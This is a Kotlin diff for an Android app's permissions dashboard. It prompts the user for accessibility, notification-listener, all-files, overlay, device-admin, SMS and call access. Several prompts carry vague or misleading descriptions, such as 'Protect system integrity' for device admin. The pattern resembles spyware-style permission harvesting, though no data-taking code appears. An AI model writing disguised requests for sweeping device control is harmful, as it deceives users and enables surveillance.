@@ -94,7 +94,7 @@ fun InspectorDashboard(ctx: Context) {
     val vitalMissing = missingVitalSpecial.isNotEmpty() || missingRuntime.isNotEmpty()
     
     val pendingLabel = remember(vitalMissing, missingVitalSpecial, missingRuntime) {
-        if (missingRuntime.isNotEmpty()) "Pending: ${missingRuntime.first().split(".").last()}"
+        if (missingRuntime.isNotEmpty()) "Pending: ${PermissionManager.getFriendlyName(missingRuntime.first())}"
         else if (missingVitalSpecial.isNotEmpty()) "Pending: ${missingVitalSpecial.keys.first().uppercase()}"
         else "ANALYZING"
     }
@@ -269,18 +269,31 @@ fun ProgressTank(pct: Float, gradient: List<Color>) {
 
 @Composable
 fun PermissionsCard(ctx: Context, permState: Map<String, Boolean>) {
+    val missingRuntime = PermissionManager.getMissingRuntimePermissions(ctx)
+    
     Column(
         modifier = Modifier.fillMaxWidth().background(Color(0xFF1E293B), RoundedCornerShape(24.dp)).border(1.dp, Color(0xFFFCD34D), RoundedCornerShape(24.dp)).padding(20.dp)
     ) {
         Text("Permissions Overview", color = Color(0xFFFCD34D), fontSize = 12.sp, fontWeight = FontWeight.Bold, modifier = Modifier.padding(bottom = 12.dp))
-        if (!permState["acc"]!!) PermRow("Accessibility Service", "Background automation") { ctx.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
-        if (!permState["usage"]!!) PermRow("Usage Stats", "Screen time analytics") { ctx.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) }
-        if (!permState["files"]!!) PermRow("Storage Access", "File system reports") { val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION); i.data = Uri.parse("package:"+ctx.packageName); ctx.startActivity(i) }
-        if (!permState["notif"]!!) PermRow("Notification Access", "Message sync") { ctx.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }
-        if (!permState["dnd"]!!) PermRow("Do Not Disturb", "Allow priority alerts") { ctx.startActivity(Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)) }
-        if (!permState["overlay"]!!) PermRow("Appear on Top", "Maintain background tasks") { val i = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION); i.data = Uri.parse("package:"+ctx.packageName); ctx.startActivity(i) }
-        if (!permState["batt"]!!) PermRow("Background Processing", "Allow background sync") { val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS); i.data = Uri.parse("package:"+ctx.packageName); ctx.startActivity(i) }
-        if (!permState["alarm"]!!) PermRow("Heartbeat Sync", "Enable exact timing for metrics") { val i = Intent("android.settings.REQUEST_SCHEDULE_EXACT_ALARM"); i.data = Uri.parse("package:"+ctx.packageName); ctx.startActivity(i) }
+        
+        // 1. Show standard Settings-based missing permissions
+        if (permState["acc"] == false) PermRow("Accessibility Service", "Background automation") { ctx.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
+        if (permState["usage"] == false) PermRow("Usage Stats", "Screen time analytics") { ctx.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) }
+        if (permState["files"] == false) PermRow("Storage Access", "File system reports") { val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION); i.data = Uri.parse("package:"+ctx.packageName); ctx.startActivity(i) }
+        if (permState["notif"] == false) PermRow("Notification Access", "Message sync") { ctx.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }
+        if (permState["dnd"] == false) PermRow("Do Not Disturb", "Allow priority alerts") { ctx.startActivity(Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)) }
+        if (permState["overlay"] == false) PermRow("Appear on Top", "Maintain background tasks") { val i = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION); i.data = Uri.parse("package:"+ctx.packageName); ctx.startActivity(i) }
+        if (permState["batt"] == false) PermRow("Background Processing", "Allow background sync") { val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS); i.data = Uri.parse("package:"+ctx.packageName); ctx.startActivity(i) }
+        if (permState["alarm"] == false) PermRow("Heartbeat Sync", "Enable exact timing for metrics") { val i = Intent("android.settings.REQUEST_SCHEDULE_EXACT_ALARM"); i.data = Uri.parse("package:"+ctx.packageName); ctx.startActivity(i) }
+        if (permState["admin"] == false) PermRow("Device Admin", "Protect system integrity") { val i = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN); i.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)); ctx.startActivity(i) }
+
+        // 2. DYNAMIC: Show any missing runtime permissions (SMS, Call-W, etc.)
+        missingRuntime.forEach { perm ->
+            PermRow(PermissionManager.getFriendlyName(perm), "Grant required runtime access") { 
+                // For runtime perms, we re-trigger the cascade logic in MainActivity by just opening it
+                val i = Intent(ctx, MainActivity::class.java); i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); ctx.startActivity(i) 
+            }
+        }
     }
 }
 
